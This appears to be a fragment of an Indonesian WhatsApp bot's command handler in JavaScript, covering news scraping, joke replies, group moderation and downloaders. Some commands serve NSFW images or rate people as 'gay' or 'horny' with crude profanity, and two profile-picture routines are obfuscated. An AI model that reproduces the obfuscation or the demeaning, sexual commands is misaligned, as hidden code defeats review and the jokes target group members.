case 'antara-news':
if (isBan) throw sticBanLu(from)
AntaraNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
jansen.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case "kontan-news":
if (isBan) throw sticBanLu(from)
KontanNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
jansen.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case "merdeka-news":
if (isBan) throw sticBanLu(from)
MerdekaNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
jansen.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted: m })
})
break
//=================================================//
case "jalantikus-meme":
if (isBan) throw sticBanLu(from)
var res = await JalanTikusMeme()
teks = ""
teks += "Jalan Tikus Meme\n\n"
teks += `Source: ${res}`
teks += ""
jansen.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted: m })
break
//=================================================//
/*Random*/
 case 'apakah':
 if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
jansen.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted: m })
break
//=================================================//
case 'bisakah':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const bisa = ['Bisa','Gak Bisa','Gak Bisa Ajg Aaokawpk','TENTU PASTI KAMU BISA!!!!']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
jansen.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ga}` }, { quoted: m })
break
//=================================================//
case 'bagaimanakah':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
jansen.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted: m })
break
//=================================================//
case 'rate':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
const ra = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const te = ra[Math.floor(Math.random() * ra.length)]
jansen.sendMessage(from, { text: `Rate : ${q}\nJawaban : *${te}%*` }, { quoted: m })
break
//=================================================//
case 'gantengcek':
case 'cekganteng':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} jansen`)
const gan = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const teng = gan[Math.floor(Math.random() * gan.length)]
jansen.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${teng}%*` }, { quoted: m })
break
//=================================================//
case 'cantikcek':
case 'cekcantik':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} jansen`)
const can = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const tik = can[Math.floor(Math.random() * can.length)]
jansen.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${tik}%*` }, { quoted: m })
break
//=================================================//
case 'sangecek':
case 'ceksange':
case 'gaycek':
case 'cekgay':
case 'lesbicek':
case 'ceklesbi':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
const sangeh = ['5', '10', '15','20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
jansen.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${sange}%*` }, { quoted: m })
break
//=================================================//
case 'kapankah':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi','20 Hari Lagi', '25 Hari Lagi','30 Hari Lagi','35 Hari Lagi','40 Hari Lagi','45 Hari Lagi','50 Hari Lagi','55 Hari Lagi','60 Hari Lagi','65 Hari Lagi','70 Hari Lagi','75 Hari Lagi','80 Hari Lagi','85 Hari Lagi','90 Hari Lagi','100 Hari Lagi','5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi','20 Bulan Lagi', '25 Bulan Lagi','30 Bulan Lagi','35 Bulan Lagi','40 Bulan Lagi','45 Bulan Lagi','50 Bulan Lagi','55 Bulan Lagi','60 Bulan Lagi','65 Bulan Lagi','70 Bulan Lagi','75 Bulan Lagi','80 Bulan Lagi','85 Bulan Lagi','90 Bulan Lagi','100 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','Besok','Lusa',`Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
jansen.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : *${kapankah}*` }, { quoted: m })
break
//=================================================//
case 'wangy':
if (isBan) throw sticBanLu(from)
if (!q) return reply (`Contoh : .wangy jansen`)
qq = q.toUpperCase()
awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
 m.reply(awikwok)
break
//=================================================//
case 'cekmati':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Invalid!\n\nYg mau di cek siapa kontol?`)
predea = await axios.get(`https://api.agify.io/?name=${q}`)
reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
break
//=================================================//
//=================================================//
case 'sc': {
jansen.sendMessage(m.chat, { image: kalimage, caption: `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
[ 🏴‍☠️ Aku Adalah Bot Jansen ]
╔══╦═╦══╗─╔╦═╦╦══╗
║╔╗║║╠╗╔╝─║║║║║╔╗║
║╔╗║║║║║╔╗║║║║║╠╣║
╚══╩═╝╚╝╚╝╚═╩═╩╝╚╝
─╔╦══╦═╦╦══╦═╦═╦╗✯
─║║╔╗║║║║══╣╦╣║║║✯
╔╣║╠╣║║║╠══║╩╣║║║✯
╚═╩╝╚╩╩═╩══╩═╩╩═╝✯
° Owner  : 6281364399250
° Version : NEW
° Baileys : 4.4.0
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
⃝✵⃟⃟❍➣TELE : https://t.me/JANSEN_MAKER
✯⃟❍➣YOUTUBE : https://youtube.com/@jansenmods
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
*NOTE*
🛡
contact me Wa.me/6281364399250
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ
© ⏤͟͟͞  𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒`,
contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@jansenmods`,
thumbnailUrl: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'chat': {
if (isBan) throw sticBanLu(from)
if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
if (args[0] === 'mute') {
jansen.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'unmute') {
jansen.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'archive') {
jansen.chatModify({archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'unarchive') {
jansen.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'read') {
jansen.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'unread') {
jansen.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'delete') {
jansen.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
}
break
//=================================================//
//=================================================//
case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
if (isBan) throw sticBanLu(from)
if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
ter = command[1].toLowerCase()
tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
break
//=================================================//
//=================================================//
case 'mediafire': {
if (isBan) throw sticBanLu(from)
if (!text) throw '*Enter a Link Query!*'
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw '*The link you provided is not valid*'
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 100) return m.reply('*File Over Limit* '+util.format(baby1))
const result4 = `*DOWNLOAD MEDIAFIRE*

*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Mime* : ${baby1[0].mime}
*Link* : ${baby1[0].link}\n
_whoa wait zimbot processing..._

*© ✯𝐉𝚫𝐍𝐒𝚵𝐍✯*`
reply(`${result4}`)
jansen.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted: m }).catch ((err) => m.reply('*Failed to download File*'))
}
break
//=================================================//
//=================================================//
/*
case 'jodohku': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
let member = participants.map(u => u.id)
let me = m.sender
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `👫Jodoh mu adalah
@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let ments = [me, jodoh]
let buttons = [
{ buttonId: 'jodohku', buttonText: { displayText: 'Jodohku' }, type: 1 }
]
await jansen.sendButtonText(m.chat, buttons, jawab, jansen.user.name, m, {mentions: ments})
}
break
//=================================================//
case 'jadian': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
let member = participants.map(u => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤
@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let menst = [orang, jodoh]
let buttons = [
{ buttonId: 'jadian', buttonText: { displayText: 'Jodohku' }, type: 1 }
]
await jansen.sendButtonText(m.chat, buttons, jawab, jansen.user.name, m, {mentions: menst})
}
break*/
//=================================================//
case 'react': {
 reactionMessage = {
react: {
text: '🇮🇩',
key: { remoteJid: from, fromMe: false, id: quoted.id }
}
}
jansen.sendMessage(from, reactionMessage)
}
break
//=================================================//
case 'join': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
let result = args[0].split('https://chat.whatsapp.com/')[1]
await jansen.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'keluar': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
await jansen.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'setexif': {
 if (isBan) throw sticBanLu(from)
 if (!text) throw `Example : ${prefix + command} packname|author`
global.packname = text.split("|")[0]
global.author = text.split("|")[1]
reply(`Exif berhasil diubah menjadi\n\n⭔ Packname : ${global.packname}\n⭔ Author : ${global.author}`)
}
break
//=================================================//
case 'kick': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await jansen.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'add': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await jansen.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'promote': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await jansen.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'demote': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await jansen.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'block': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await jansen.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'unblock': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await jansen.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'setname': case 'setsubject': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (!text) throw 'Text ?'
await jansen.groupUpdateSubject(m.chat, text).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'setdesc': case 'setdesk': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (!text) throw 'Text ?'
await jansen.groupUpdateDescription(m.chat, text).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'nsfw': {
if (isBan) throw sticBanLu(from)

if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiNsfw) return m.reply('Sudah Aktif')
ntnsfw.push(from)
m.reply('Sukses Telah mengaktifkan Nsfw Di group Ini')
var groupe = await jansen.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
jansen.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiNsfw) return m.reply('Sudah Non Aktif')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
m.reply('Sukses Mematikan Nsfw di group ini')
} else {
const anuu = {
video:fs.readFileSync("./basejansen/video/jansen.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:  `Ketik Text Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan
\n\n*HELLO SANGEAN\n\n
trap
gasm
nwaifu
hneko `,
}
jansen.sendMessage(m.chat, anuu, `${global.botname}`, m)
}
}
break
case 'trap' :
if (isBan) throw sticBanLu(from)

if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)
 const trapbot = {
image: {url:waifudd.data.url},
caption:`Here you go!`,
}
jansen.sendMessage(m.chat, trapbot, { quoted: m }).catch(err => {
 return('Error!')
})
break
case 'hentai-neko' :
case 'hneko' :
if (isBan) throw sticBanLu(from)

if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 const hnekobot = {
image: {url:waifudd.data.url},
caption:`Here you go!`,
}
jansen.sendMessage(m.chat, hnekobot, { quoted: m }).catch(err => {
 return('Error!')
})
break
case 'hentai-waifu' :
case 'nwaifu' :
if (isBan) throw sticBanLu(from)

if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
 const nwaifubot = {
image: {url:waifudd.data.url},
caption:`Here you go!`,
}
jansen.sendMessage(m.chat, nwaifubot, { quoted: m }).catch(err => {
 return('Error!')
})
break
case 'gasm':
if (isBan) throw sticBanLu(from)

if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait) 
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
 const wbuttsss = {
image: {url:waifudd.data.url},
caption:`Here you go!`,
}
jansen.sendMessage(m.chat, wbuttsss,{ quoted: m }).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'setppbot': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
sticWait(from)
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
var _0x1c413d=_0x2a1c;(function(_0x477de5,_0x25404c){var _0xc6ef35=_0x2a1c,_0x1a86a3=_0x477de5();while(!![]){try{var _0x392e78=parseInt(_0xc6ef35(0xff))/0x1+-parseInt(_0xc6ef35(0xfc))/0x2+-parseInt(_0xc6ef35(0xf9))/0x3*(parseInt(_0xc6ef35(0xfe))/0x4)+parseInt(_0xc6ef35(0x103))/0x5*(parseInt(_0xc6ef35(0x100))/0x6)+parseInt(_0xc6ef35(0x105))/0x7+parseInt(_0xc6ef35(0x108))/0x8+-parseInt(_0xc6ef35(0x102))/0x9*(parseInt(_0xc6ef35(0xfd))/0xa);if(_0x392e78===_0x25404c)break;else _0x1a86a3['push'](_0x1a86a3['shift']());}catch(_0x4aa4a8){_0x1a86a3['push'](_0x1a86a3['shift']());}}}(_0x512f,0x3121c));var media=await jansen[_0x1c413d(0x10a)](quoted);function _0x2a1c(_0x26455a,_0x1953ac){var _0x512fee=_0x512f();return _0x2a1c=function(_0x2a1c5a,_0x267fa3){_0x2a1c5a=_0x2a1c5a-0xf8;var _0xfaa61b=_0x512fee[_0x2a1c5a];return _0xfaa61b;},_0x2a1c(_0x26455a,_0x1953ac);}try{if(args[0x0]==_0x1c413d(0xfa)){const {generateProfilePicture}=require('./basejansen/lib/myfunc');var {img}=await generateProfilePicture(media);await jansen[_0x1c413d(0x106)]({'tag':'iq','attrs':{'to':botNumber,'type':'set','xmlns':_0x1c413d(0x107)},'content':[{'tag':_0x1c413d(0xf8),'attrs':{'type':_0x1c413d(0xfb)},'content':img}]});}else await jansen[_0x1c413d(0x101)](botNumber,{'url':media});m['reply'](mess[_0x1c413d(0x109)]);}catch{m[_0x1c413d(0x104)]('Gagal\x20Mengganti\x20Photo\x20Profile');}function _0x512f(){var _0x2f232f=['reply','1286194bdHKgR','query','w:profile:picture','3088072VzwWid','success','downloadAndSaveMediaMessage','picture','153igiZJi','/full','image','720650VaxDBN','2205790rCEybd','5796etOiDI','80334lizMjF','6GdpecB','updateProfilePicture','9DZAUSC','1029810dkCbDi'];_0x512f=function(){return _0x2f232f;};return _0x512f();}
}
break
//=================================================//
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
sticWait(from)
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
const _0x3c52ee=_0x4109;(function(_0x1a4f9f,_0x3819cc){const _0x5c4a67=_0x4109,_0x4d0e21=_0x1a4f9f();while(!![]){try{const _0x2fe536=-parseInt(_0x5c4a67(0x78))/0x1+parseInt(_0x5c4a67(0x7a))/0x2*(-parseInt(_0x5c4a67(0x7e))/0x3)+parseInt(_0x5c4a67(0x73))/0x4+parseInt(_0x5c4a67(0x7c))/0x5+-parseInt(_0x5c4a67(0x72))/0x6+parseInt(_0x5c4a67(0x76))/0x7+parseInt(_0x5c4a67(0x70))/0x8;if(_0x2fe536===_0x3819cc)break;else _0x4d0e21['push'](_0x4d0e21['shift']());}catch(_0x3ccaac){_0x4d0e21['push'](_0x4d0e21['shift']());}}}(_0x38ce,0x9724c));function _0x4109(_0x2b2147,_0x340f6c){const _0x38ce6f=_0x38ce();return _0x4109=function(_0x410966,_0x2335d5){_0x410966=_0x410966-0x6d;let _0xbe9a92=_0x38ce6f[_0x410966];return _0xbe9a92;},_0x4109(_0x2b2147,_0x340f6c);}let media=await jansen['downloadAndSaveMediaMessage'](quoted);function _0x38ce(){const _0x2fbc7e=['43773HHkTHV','w:profile:picture','./basejansen/lib/myfunc','chat','10418328MFCmiM','reply','6441450CkyNxQ','1458440XVIgpe','set','picture','4984819pxHUxY','/full','786695iyptWU','query','142qiVRKp','image','5681485dynfLf','Gagal\x20Mengganti\x20Photo\x20Profile'];_0x38ce=function(){return _0x2fbc7e;};return _0x38ce();}try{if(args[0x0]==_0x3c52ee(0x77)){const {generateProfilePicture}=require(_0x3c52ee(0x6e));var {img}=await generateProfilePicture(media);await jansen[_0x3c52ee(0x79)]({'tag':'iq','attrs':{'to':m[_0x3c52ee(0x6f)],'type':_0x3c52ee(0x74),'xmlns':_0x3c52ee(0x6d)},'content':[{'tag':_0x3c52ee(0x75),'attrs':{'type':_0x3c52ee(0x7b)},'content':img}]});}else await jansen['updateProfilePicture'](m[_0x3c52ee(0x6f)],{'url':media});m[_0x3c52ee(0x71)](mess['success']);}catch{m['reply'](_0x3c52ee(0x7d));}
}
break
//=================================================//
case 'tagall': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
jansen.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
//=================================================//
case 'hidetag': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
jansen.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
//=================================================//
case 'style': case 'styletext': {
if (isBan) throw sticBanLu(from) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
let { styletext } = require('./basejansen/lib/scraper')
if (!text) throw 'Masukkan Query text!'
let anu = await styletext(text)
let teks = `Srtle Text From ${text}\n\n`
for (let i of anu) {
teks += `⭔ *${i.name}* : ${i.result}\n\n`
}
reply(teks)
}
break
//=================================================//
//=================================================//
 case 'group': case 'grup': {
 if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (args[0] === 'close'){
await jansen.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
await jansen.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
const anmu = {
video:fs.readFileSync("./basejansen/video/jansen.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:  `Mode Group`,
}
jansen.sendMessage(m.chat, anmu, `Mode Group`, jansen.user.name, m)
 }
}
break
//=================================================//
case 'editinfo': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
 if (args[0] === 'open'){
await jansen.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else if (args[0] === 'close'){
await jansen.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else {
 const anju = {
video:fs.readFileSync("./basejansen/video/jansen.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:  `Mode Edit Info`,
}
jansen.sendMessage(m.chat, anju, `Mode Edit Info`, jansen.user.name, m)
}
}
break
//=================================================//
 case 'mute': {
 if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (args[0] === "on") {
if (db.data.chats[m.chat].mute) return m.reply(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].mute = true
m.reply(`${jansen.user.name} telah di mute di group ini !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].mute = false
m.reply(`${jansen.user.name} telah di unmute di group ini !`)
} else {
 const anaku = {
video:fs.readFileSync("./basejansen/video/jansen.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:  `Mute Bot`,
}
jansen.sendMessage(m.chat, anaku, `Mute Bot`, jansen.user.name, m)
}
 }
 break
//=================================================//
//=================================================//
case 'linkgroup': case 'linkgc': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
let response = await jansen.groupInviteCode(m.chat)
